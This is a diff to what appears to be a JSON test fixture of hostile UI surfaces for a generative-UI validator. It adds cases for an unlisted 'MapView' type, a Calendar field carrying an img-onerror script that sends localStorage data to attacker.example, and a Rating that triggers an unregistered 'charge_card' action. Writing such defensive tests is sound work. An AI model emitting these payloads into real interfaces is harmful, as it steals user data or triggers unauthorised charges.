@@ -1,5 +1,5 @@
 {
-  "description": "Four surfaces a hostile agent, tool, or fetched page might emit. Each breaks one invariant. The validator names and rejects the offending component while the safe part still renders.",
+  "description": "Seven surfaces a hostile agent, tool, or fetched page might emit — four against the base catalog and three against the Map/Calendar/Rating student extensions. Each breaks one invariant. The validator names and rejects the offending component while the safe part still renders.",
   "cases": [
     {
       "name": "raw-html-type",
@@ -54,6 +54,48 @@
           {"id": "evil", "type": "Button", "label": "Wire funds", "onPress": {"action": "transfer_all_funds"}}
         ],
         "dataModel": {"title": "Dashboard"}
+      },
+      "expect_invariant": "event"
+    },
+    {
+      "name": "map-near-miss-type",
+      "note": "A student extension added Map, so an attacker tries the plausible neighbours. MapView is not the catalog's name, and a name that is not in the catalog cannot render.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
+          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
+          {"id": "evil", "type": "MapView", "src": "https://attacker.example/tiles/{z}/{x}/{y}.png"}
+        ],
+        "dataModel": {"title": "Kyoto, three days"}
+      },
+      "expect_invariant": "catalog"
+    },
+    {
+      "name": "markup-in-calendar-binding",
+      "note": "A Calendar whose events slot carries markup instead of a binding, hoping a day label reaches innerHTML.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
+          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
+          {"id": "evil", "type": "Calendar", "title": "Itinerary", "events": "<img src=x onerror=\"fetch('https://attacker.example/e?m='+localStorage.memoryHandle)\">"}
+        ],
+        "dataModel": {"title": "Kyoto, three days"}
+      },
+      "expect_invariant": "data-not-code"
+    },
+    {
+      "name": "rating-unregistered-action",
+      "note": "A Rating whose star tap names an action the catalog never registered. select_day and rate are registered; charge_card is not.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
+          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
+          {"id": "evil", "type": "Rating", "label": "Ryokan", "value": {"$bind": "/score"}, "max": 5, "onRate": {"action": "charge_card"}}
+        ],
+        "dataModel": {"title": "Kyoto, three days", "score": 4.6}
       },
       "expect_invariant": "event"
     }
